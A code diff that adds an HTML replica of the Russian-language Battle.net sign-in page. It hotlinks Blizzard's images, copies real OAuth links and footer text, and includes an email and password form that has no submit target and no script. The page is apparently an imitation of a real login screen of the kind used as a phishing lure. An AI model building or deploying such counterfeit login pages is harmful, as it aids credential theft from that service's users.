@@ -1,0 +1,391 @@
+<html>
+    <head>
+        <meta charset="utf-8">
+        <style>
+            body{
+                margin: 0;
+                font-family: "Object Sans", "Arial", "Helvetica", "Segoe UI Symbol", "Segoe MDL2 Assets", sans-serif;
+                background: #1c1e26;
+            }
+
+            h3{
+                font-weight: 700;
+                font-size: 32px;
+                line-height: 36px;
+                margin: 40px 0px;
+                text-align: center;
+                display: block;
+                color: #ffffff;
+            }
+
+            .page-wrapper{
+                width: 100%;
+                height: 100%;
+                min-height: 100%;
+                box-sizing: unset;
+                padding: 0;
+                margin: 0;
+            }
+
+            .main-box::before{
+                content: "";
+                flex-grow: 1;
+                min-height: 24px;
+                height: 24px;
+                max-height: 24px;
+                display: block;
+            }
+
+            .main-box{
+                display: flex;
+                flex-direction: column;
+                min-height: 100%;
+                width: 416px;
+                margin: 0 auto 25px;
+                position: static;
+                padding-bottom: 40px;
+                transform: none;
+            }
+
+            .main-box-inner{    
+                padding: 24px 0;
+            }
+
+            .logo{
+                margin: 0 auto 38px auto;
+                width: 240px;
+                height: 72px;
+                display: flex;
+                align-items: center;
+            }
+
+            .external-login-first-row,
+            .external-login-second-row{
+                display: flex;
+                flex-flow: row wrap;
+                justify-content: center;
+                align-items: center;
+                margin: 0 40px;
+            }
+
+            .external-login-btns{
+                width: 48px;
+                height: 48px;
+                padding: 13px;
+                border-radius: 4px;
+                margin: 12px;
+                display: block;
+                text-align: center;
+                box-sizing: border-box;
+            }
+
+            .google-login,
+            .apple-login,
+            .steam-login{
+                background-color: #fff;
+            }
+
+            .facebook-login{
+                background-color: #1877F2;
+            }
+
+            .xbox-login{
+                background-color: #107c10;
+            }
+
+            .playstation-login{
+                background-color: #0070CC;
+            }
+
+            .switch-login{
+                background-color: #e60012;
+            }
+
+            .google-login img{
+                width: 17px;
+                height: 18px;
+            }
+
+            .facebook-login img{
+                width: 18px;
+                height: 18px;
+            }
+
+            .apple-login img{
+                width: 15px;
+                height: 19px;
+            }
+
+            .xbox-login img,
+            .switch-login img,
+            .steam-login img{
+                width: 16px;
+                height: 16px;
+            }
+
+            .playstation-login img{
+                height: 21px;
+                width: 15px;
+            }
+
+            .separating-line{
+                margin: 40px 0 24px 0;
+                font-style: normal;
+                font-weight: 700;
+                font-size: 14px;
+                font-family: "Noto Sans", "Object Sans", sans-serif;
+                line-height: 21px;
+                text-align: center;
+                color: rgba(255, 255, 255, 0.6);
+                text-transform: none;
+                display: block;
+                overflow: hidden;
+                white-space: nowrap;
+            }
+
+            .separating-line span{
+                position: relative;
+                display: inline-block;
+            }
+
+            .separating-line span::before,
+            .separating-line span::after{
+                width: 500px;
+                content: "";
+                height: 1px;
+                background-color: rgba(255, 255, 255, 0.18);
+                position: absolute;
+                top: 50%;
+            }
+
+            .separating-line span::before{
+                right: 100%;
+                margin-right: 20px;
+            }
+
+            .separating-line span::after{
+                left: 100%;
+                margin-left: 20px;  
+            }
+
+            .input-field{
+                margin: 0 auto 11px;
+                display: block;
+            }
+
+            .login-fields input{
+                width: 100%;
+                box-shadow: inherit;
+                outline: none;
+                display: inline-block;
+                vertical-align: middle;
+                height: 40px;
+                padding: 0 12px;
+                margin-top: 3px;
+                margin-bottom: 3px;
+                font-size: 16px;
+                line-height: 24px;
+                border: 1px solid rgba(255, 255, 255, 0.36);
+                background-color: #171920;
+                color: #ffffff;
+                -moz-box-sizing: border-box;
+                box-sizing: border-box;
+                border-radius: 4px;
+            }
+
+            .submit-btn{
+                margin: 35px auto 11px;
+                text-align: center;
+            }
+
+            .submit-btn button{
+                margin-top: 5px;
+                margin-bottom: 6px;
+                display: block;
+                width: 100%;
+                padding: 0;
+                background-color: #0074e0;
+                color: #ffffff;
+                border: 2px solid transparent;
+                font-weight: 500;
+                border-radius: 4px;
+                white-space: normal;
+                font-size: 16px;
+                line-height: 20px;
+                min-height: 40px;
+                text-align: center;
+                box-sizing: border-box;
+                cursor: pointer;
+            }
+
+            .help-links{
+                margin: 48px 0 0 0;
+                padding: 0;
+                font-size: 16px;
+                line-height: 24px;
+                list-style-type: none;
+                text-align: center;
+            }
+
+            .help-links li{
+                margin-bottom: 24px;
+                padding-left: 0;
+                font-family: "Noto Sans", "Georgia", "Times New Roman", "Times", "Segoe UI Symbol", "Segoe MDL2 Assets", sans-serif;
+                line-height: 24px;
+                margin: 0 0 24.75px 0;   
+            }
+
+            .help-links a{
+                color: #148eff;
+                text-decoration: none;
+                text-underline-position: under;
+                font-weight: 700;
+            }
+
+            footer{
+                position: relative;
+                padding-bottom: 24px;
+                bottom: 20px;
+                width: 100%;
+                background: none;
+            }
+
+            .footer-content{
+                padding: 10px;
+                padding-left: 0;
+                padding-right: 0;
+                width: 700px;
+                min-width: auto;
+                margin: 0 auto;
+                border: none;
+                color: #7b7b7b;
+                box-sizing: border-box;
+                font-size: 14px;
+                line-height: 21px;
+            }
+
+            .footer-links{
+                font-size: 12px;
+                cursor: pointer;
+                font-weight: 400;
+                font-family: "Noto Sans", "Georgia", "Times New Roman", "Times", "Segoe UI Symbol", "Segoe MDL2 Assets", sans-serif;
+                text-align: center;
+                
+            }
+
+            .footer-links a{
+                text-decoration: none;
+                color: rgba(255, 255, 255, 0.7);
+            }
+
+            .copyright{
+                padding: 8px 0;
+                color: rgba(255, 255, 255, 0.3);
+                font-size: 12px;
+                letter-spacing: 0;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="page-wrapper">
+            <div class="main-box">
+                <div class="main-box-inner">
+                    <div class="logo">
+                        <img src="https://bnetaccount.akamaized.net/login/static/images/toolkit/defaults/logos/bnet/logo-horizontal-color-light.1z1fI.svg">
+                    </div>
+                    <div class="login">
+                        <h3>Авторизоваться</h3>
+                        <div class="external-login-first-row">
+                            <a class="external-login-btns google-login" href="https://eu.account.battle.net/login/ru/?ref=https://oauth.battle.net/authorize?response_type%3Dcode%26client_id%3D057adb2af62a4d59904f74754838c4c8%26scope%3Daccount.full%2520commerce.virtualcurrency.full%2520account-settings.full%26state%3Drk6xiMn0xil_qWlIjdhi7qHZv1dU6NcpujYdgK2Rx5Q%253D%26redirect_uri%3Dhttps://account.battle.net/callback/oauth2/code/account-settings&app=bas&hostingApp=bas">
+                                <img src="https://bnetaccount.akamaized.net/login/static/images/login/social/google-logo-color.svg">
+                            </a>
+                            <a class="external-login-btns facebook-login" href="https://eu.account.battle.net/login/ru/?ref=https://oauth.battle.net/authorize?response_type%3Dcode%26client_id%3D057adb2af62a4d59904f74754838c4c8%26scope%3Daccount.full%2520commerce.virtualcurrency.full%2520account-settings.full%26state%3Drk6xiMn0xil_qWlIjdhi7qHZv1dU6NcpujYdgK2Rx5Q%253D%26redirect_uri%3Dhttps://account.battle.net/callback/oauth2/code/account-settings&app=bas&hostingApp=bas">
+                                <img src="	https://bnetaccount.akamaized.net/login/static/images/login/social/facebook-logo-white.svg">
+                            </a>
+                            <a class="external-login-btns apple-login" href="https://eu.account.battle.net/login/ru/?ref=https://oauth.battle.net/authorize?response_type%3Dcode%26client_id%3D057adb2af62a4d59904f74754838c4c8%26scope%3Daccount.full%2520commerce.virtualcurrency.full%2520account-settings.full%26state%3Drk6xiMn0xil_qWlIjdhi7qHZv1dU6NcpujYdgK2Rx5Q%253D%26redirect_uri%3Dhttps://account.battle.net/callback/oauth2/code/account-settings&app=bas&hostingApp=bas">
+                                <img src="	https://bnetaccount.akamaized.net/login/static/images/login/social/apple-logo-black.svg">
+                            </a>
+                        </div>
+                        <div class="external-login-second-row">
+                            <a class="external-login-btns xbox-login" href="https://eu.account.battle.net/login/ru/?ref=https://oauth.battle.net/authorize?response_type%3Dcode%26client_id%3D057adb2af62a4d59904f74754838c4c8%26scope%3Daccount.full%2520commerce.virtualcurrency.full%2520account-settings.full%26state%3Drk6xiMn0xil_qWlIjdhi7qHZv1dU6NcpujYdgK2Rx5Q%253D%26redirect_uri%3Dhttps://account.battle.net/callback/oauth2/code/account-settings&app=bas&hostingApp=bas">
+                                <img src="https://bnetaccount.akamaized.net/login/static/images/login/social/xbox-logo-white.svg">
+                            </a>
+                            <a class="external-login-btns playstation-login" href="https://eu.account.battle.net/login/ru/?ref=https://oauth.battle.net/authorize?response_type%3Dcode%26client_id%3D057adb2af62a4d59904f74754838c4c8%26scope%3Daccount.full%2520commerce.virtualcurrency.full%2520account-settings.full%26state%3Drk6xiMn0xil_qWlIjdhi7qHZv1dU6NcpujYdgK2Rx5Q%253D%26redirect_uri%3Dhttps://account.battle.net/callback/oauth2/code/account-settings&app=bas&hostingApp=bas">
+                                <img src="https://bnetaccount.akamaized.net/login/static/images/login/social/playstation-logo-white.svg">
+                            </a>
+                            <a class="external-login-btns switch-login" href="https://eu.account.battle.net/login/ru/?ref=https://oauth.battle.net/authorize?response_type%3Dcode%26client_id%3D057adb2af62a4d59904f74754838c4c8%26scope%3Daccount.full%2520commerce.virtualcurrency.full%2520account-settings.full%26state%3Drk6xiMn0xil_qWlIjdhi7qHZv1dU6NcpujYdgK2Rx5Q%253D%26redirect_uri%3Dhttps://account.battle.net/callback/oauth2/code/account-settings&app=bas&hostingApp=bas">
+                                <img src="https://bnetaccount.akamaized.net/login/static/images/login/social/switch-logo-white.svg">
+                            </a>
+                            <a class="external-login-btns steam-login" href="https://eu.account.battle.net/login/ru/?ref=https://oauth.battle.net/authorize?response_type%3Dcode%26client_id%3D057adb2af62a4d59904f74754838c4c8%26scope%3Daccount.full%2520commerce.virtualcurrency.full%2520account-settings.full%26state%3Drk6xiMn0xil_qWlIjdhi7qHZv1dU6NcpujYdgK2Rx5Q%253D%26redirect_uri%3Dhttps://account.battle.net/callback/oauth2/code/account-settings&app=bas&hostingApp=bas">
+                                <img src="https://bnetaccount.akamaized.net/login/static/images/login/social/steam-logo-black.svg">
+                            </a>
+                        </div>
+                        <div class="separating-line">
+                            <span>
+                                или войти через
+                            </span>
+                        </div>
+                        <form class="password-form">
+                            <div class="login-fields">
+                                <div class="input-field">
+                                    <input type="text" placeholder="Электронная почта или телефон" autocorrect="off" spellcheck="false">
+                                </div>
+                                <div class="input-field">
+                                    <input type="password" placeholder="Пароль" autocomplete="off" autocorrect="off" spellcheck="false">
+                                </div>
+                            </div>
+                            <div class="submit-btn">
+                                <button type="submit">
+                                     Авторизоваться 
+                                </button>
+                                <!-- <input type="submit" value=""> -->
+                            </div>
+                        </form>
+                        <ul class="help-links">
+                            <li>
+                                <a href="https://account.battle.net/creation/?ref=https%3A%2F%2Foauth.battle.net%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D057adb2af62a4d59904f74754838c4c8%26scope%3Daccount.full%2520commerce.virtualcurrency.full%2520account-settings.full%26state%3Drk6xiMn0xil_qWlIjdhi7qHZv1dU6NcpujYdgK2Rx5Q%253D%26redirect_uri%3Dhttps%3A%2F%2Faccount.battle.net%2Fcallback%2Foauth2%2Fcode%2Faccount-settings&theme=bnet-next&app=bas&hostingApp=bas&flowTrackingId=8c15fbe3-ae12-4761-b968-1296916e2bb1&bdp=4561ec2a4853399ea0ef214c45d61d3168acd1a9e17dad5d99b1e17e8a82cb41">
+                                    Зарегистрируйте учетную запись Battle.net бесплатно
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://account.battle.net/recovery/?ref=&theme=bnet-next&app=bas&hostingApp=bas&flowTrackingId=8c15fbe3-ae12-4761-b968-1296916e2bb1">
+                                    Вы не можете войти?
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <div class="footer-content">
+                    <div class="footer-links">
+                        <a href="https://www.blizzard.com/company/legal/eula">
+                            ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ BLIZZARD
+                        </a>
+                        <span>|</span>
+                        <a href="https://www.blizzard.com/company/about/privacy.html">
+                            ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ
+                        </a>
+                        <span>|</span>
+                        <a href="https://www.blizzard.com/company/legal/">
+                            УСЛОВИЯ
+                        </a>
+                        <span>|</span>
+                        <a href="https://eu.blizzard.com/company/about/infringementnotice.html">
+                            АВТОРСКОЕ ПРАВО
+                        </a>
+                        <span>|</span>
+                        <a href="https://eu.account.battle.net/login/cookies">
+                            ФАЙЛЫ COOKIE
+                        </a>
+                        <span>|</span>
+                        <a href="https://eu.account.battle.net/login/cookies#settings">
+                            ПАРАМЕТРЫ COOKIE
+                        </a>
+                        <div class="copyright">© BLIZZARD ENTERTAINMENT, INC., 2023</div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </body>
+</html>
